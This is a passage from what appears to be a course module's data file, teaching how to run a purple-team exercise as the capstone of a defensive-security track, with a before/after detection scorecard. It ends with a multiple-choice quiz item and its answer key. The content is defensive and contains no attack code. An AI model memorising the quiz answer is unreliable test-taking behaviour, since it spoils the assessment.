1. **Pick a threat and chain.** From threat intel, choose an adversary relevant to you and a chain of ATT&CK techniques: initial access → execution (LOTL) → persistence (cron/systemd) → privilege escalation (SUID/sudo) → credential access → lateral movement → exfiltration.
2. **Emulate it** (Atomic Red Team / Caldera) on a lab that mirrors production, with the blue team watching.
3. **Measure detection** at each step: did telemetry capture it (auditd/eBPF)? Did a rule fire? What was the MTTD? Record every step as detected / logged-but-no-alert / blind.
4. **Close gaps.** For each miss: if telemetry existed but no rule, write a Sigma rule; if no telemetry, add the logging; if a control should have blocked it, fix the hardening. Re-run until the chain lights up reliably.
5. **Validate response.** Practise the IR: isolate, preserve (memory + timeline), eradicate every persistence mechanism, recover from immutable backup. Measure MTTR.
6. **Report.** Before/after ATT&CK coverage, MTTD/MTTR, the new detections and hardening, and the remaining backlog.

## Why this is the capstone

It exercises everything: hardening (does the chain get blocked?), telemetry (auditd, eBPF, centralized logs), detection engineering (Sigma rules, tuning), hunting and forensics (memory, timeline, rootkit checks), IR (contain/preserve/eradicate/recover), and measurement (coverage, MTTD/MTTR). And it produces the one thing that matters: **evidence, before and after, that specific work made your environment measurably harder to attack and faster to defend.** That loop — emulate, measure, improve, re-measure — repeated on a schedule, *is* professional defence.

> You now have the full arc: from a first \`ls -la\` on a lab VM to leading an intelligence-driven purple-team program. Keep the loop turning, keep the evidence, and keep learning — the adversary does.`,
      sample: {
        lang: 'text',
        caption: 'A purple-team exercise scorecard: the whole track, measured',
        code: `Chain: emulated APT-style intrusion (7 ATT&CK techniques)

Step                        Before        After the exercise
-----------------------------------------------------------------
T1566 phishing (access)     blind         logged + alert   ✓
T1059 LOTL execution        logged, alert alert (tuned)    ✓
T1053 cron persistence      logged        alert (new Sigma)✓
T1548 SUID privesc          BLOCKED       BLOCKED (baseline)✓
T1003 credential access     blind         alert (new rule) ✓
T1021 lateral movement      blind         BLOCKED (zero-trust seg)
T1041 exfiltration          logged        alert + DLP      ✓

MTTD: 9 days -> 40 minutes    ATT&CK coverage: 3/7 -> 7/7`,
        output: `Evidence, before and after, that the environment is measurably
harder to attack and faster to defend. Schedule the next
exercise; the loop is the job.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the essential outcome of a well-run purple-team exercise that makes it the capstone of a defensive program?',
        options: [
          'Proving the red team is skilled',
          'Concrete before/after evidence — improved ATT&CK coverage, lower MTTD/MTTR, new detections and hardening — showing that specific work made the environment measurably harder to attack and faster to defend, via a repeatable emulate-measure-improve loop',
          'A list of tools that were purchased',
          'Confirmation that no attacker will ever succeed',
        ],
        answer: 1,
        explain:
          'The exercise integrates the entire discipline — hardening, telemetry, detection engineering, hunting, forensics, IR and measurement — and its value is the evidence it produces: coverage and MTTD/MTTR that improved because of identified, closed gaps. Repeating that loop on a schedule is what continuous, accountable, intelligence-driven defence looks like in practice.',
        hint: 'What does the exercise let you prove, with numbers, before and after?',
      },
    },
  ],
}

export default level
